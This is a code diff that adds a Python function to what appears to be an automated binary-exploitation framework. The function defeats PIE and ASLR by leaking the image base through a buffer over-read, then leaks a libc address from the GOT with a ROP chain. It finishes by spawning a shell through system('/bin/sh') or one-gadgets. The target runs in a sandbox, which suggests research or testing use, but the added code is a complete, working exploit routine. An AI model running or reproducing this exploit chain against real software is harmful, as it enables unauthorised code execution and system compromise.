@@ -416,6 +416,133 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                                    "shell under either stack alignment)", "leaked": last_leaked}
 
 
+def pie_ret2libc_leak(exe, workdir, *, offset, leak_trigger, target_bytes, pop_rdi_off,
+                      puts_plt_off, puts_got_off, ret_to_off, puts_libc_off, system_off, binsh_off,
+                      ret_gadget_off=None, leaker="puts", pop_rsi_off=None, pop_rdx_off=None,
+                      write_plt_off=None, one_gadget_offs=(), base_argv=(), timeout: float = 10.0,
+                      mem_mb: int = 2048) -> dict:
+    """PIE ret2libc defeating ASLR with TWO leaks in ONE process -- an honest defeat (it never
+    assumes a fixed base).
+
+      phase 0: a buffer OVER-READ (the `leak_trigger` fills the leak read) spills RETURN addresses;
+               `recover_pie_base` pins the image base, and every binary address below is relocated
+               by it. No format-string sink needed.
+      stage 1: a base-relocated `puts(puts@GOT)` / `write(1, GOT, 8)` prints the libc address of the
+               leaked symbol, then returns to `ret_to` (main) so the loop reads again.
+      stage 2: `resolve_libc_base` -> `system("/bin/sh")` (or a one-gadget), after re-feeding the
+               staging read the re-entered loop performs first.
+
+    Every `*_off` binary address is an IMAGE offset (relocated by the recovered base); the libc
+    `*_off` are offsets in the loading libc. Confirmed by a spawned shell that EVALUATES the
+    forgery-proof marker (never an echo). system()'s rsp parity is environment-dependent, so both
+    alignments are detonated on a fresh process each. Returns {ok, pie_base, libc_base, ...}."""
+    from . import attribution, rop
+    from .exploit import recover_pie_base
+    markers = attribution.make_code_markers()
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+
+    finishers = []                                       # (technique, one_gadget_off | None)
+    if system_off is not None and binsh_off is not None:
+        finishers.append(("ret2libc", None))
+    finishers += [("one_gadget", og) for og in (one_gadget_offs or ())]
+    aligns = [None, ret_gadget_off] if ret_gadget_off is not None else [None]
+    last = {"ok": False, "reason": "no PIE base recovered from the over-read leak"}
+
+    def _leak_base(p):
+        try:
+            p.stdin.write(leak_trigger); p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return None
+        return recover_pie_base(_le_pointer_words(_read_until(p, time.time() + timeout / 2)),
+                                target_bytes)
+
+    for tech, fog in finishers:
+        for align_off in aligns:
+            for _ in range(2):                           # a short read on a stage is worth a retry
+                preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+                cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+                try:
+                    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                         stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                         preexec_fn=preexec)
+                except Exception as e:                   # noqa: BLE001
+                    return {"ok": False, "reason": f"spawn failed: {e!r}"}
+                try:
+                    _read_until(p, time.time() + 0.5)    # banner
+                    base = _leak_base(p)                 # phase 0: recover the PIE image base
+                    if not base:
+                        continue
+                    pop_rdi, ret_to, puts_got = base + pop_rdi_off, base + ret_to_off, base + puts_got_off
+                    # stage 1: leak a libc pointer out of a GOT slot, return to the loop
+                    if (leaker == "write" and pop_rsi_off is not None and pop_rdx_off is not None
+                            and write_plt_off is not None):
+                        s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=base + pop_rsi_off,
+                                                  pop_rdx=base + pop_rdx_off, got=puts_got,
+                                                  write_plt=base + write_plt_off, ret_to=ret_to,
+                                                  ret_gadget=None)
+                    else:
+                        s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
+                                                 puts_plt=base + puts_plt_off, ret_to=ret_to,
+                                                 ret_gadget=None)
+                    try:
+                        p.stdin.write(s1); p.stdin.flush()
+                    except (BrokenPipeError, OSError):
+                        continue
+                    burst = _read_until(p, time.time() + timeout / 2)
+                    raw = burst[:8] if leaker == "write" else burst.split(b"\n", 1)[0][:6]
+                    if len(raw) < 6:
+                        continue
+                    leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
+                    libc_base = rop.resolve_libc_base(leaked, puts_libc_off)
+                    if not libc_base:
+                        last = {"ok": False, "reason": "PIE base ok but libc leak unrecognised",
+                                "pie_base": base, "leaked": leaked}
+                        continue
+                    # the loop re-enters: satisfy the staging (over-read) read, drain its echo
+                    try:
+                        p.stdin.write(leak_trigger); p.stdin.flush()
+                    except (BrokenPipeError, OSError):
+                        continue
+                    _read_until(p, time.time() + 0.4)
+                    align = (base + align_off) if align_off is not None else None
+                    if tech == "ret2libc":
+                        s2 = rop.build_ret2system(offset, pop_rdi, libc_base + binsh_off,
+                                                  libc_base + system_off, 0, ret_gadget=align)
+                    else:
+                        pad = struct.pack("<Q", align) if align else b""
+                        s2 = bytes(bytearray(b"A" * offset) + pad
+                                   + struct.pack("<Q", libc_base + fog))
+                    try:
+                        p.stdin.write(s2); p.stdin.flush()
+                        time.sleep(0.3)
+                        p.stdin.write(markers.command + b"\n"); p.stdin.flush()
+                    except (BrokenPipeError, OSError):
+                        continue
+                    out = _read_until(p, time.time() + timeout, quiet=1.5)
+                    if markers.proves(out):
+                        r = {"ok": True, "pie_base": base, "libc_base": libc_base, "technique": tech,
+                             "align": align_off, "output": out[:400].decode("latin-1", "ignore")}
+                        if tech == "ret2libc":
+                            r["system"], r["binsh"] = libc_base + system_off, libc_base + binsh_off
+                        else:
+                            r["one_gadget"] = libc_base + fog
+                        return r
+                finally:
+                    for stream in (p.stdin, p.stdout):
+                        try:
+                            if stream is not None:
+                                stream.close()
+                        except Exception:                # noqa: BLE001
+                            pass
+                    _kill(p)
+                    try:
+                        p.wait(timeout=2)
+                    except Exception:                    # noqa: BLE001
+                        pass
+    return last
+
+
 def ret2dlresolve(exe, workdir, *, offset, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
                   jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
                   base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
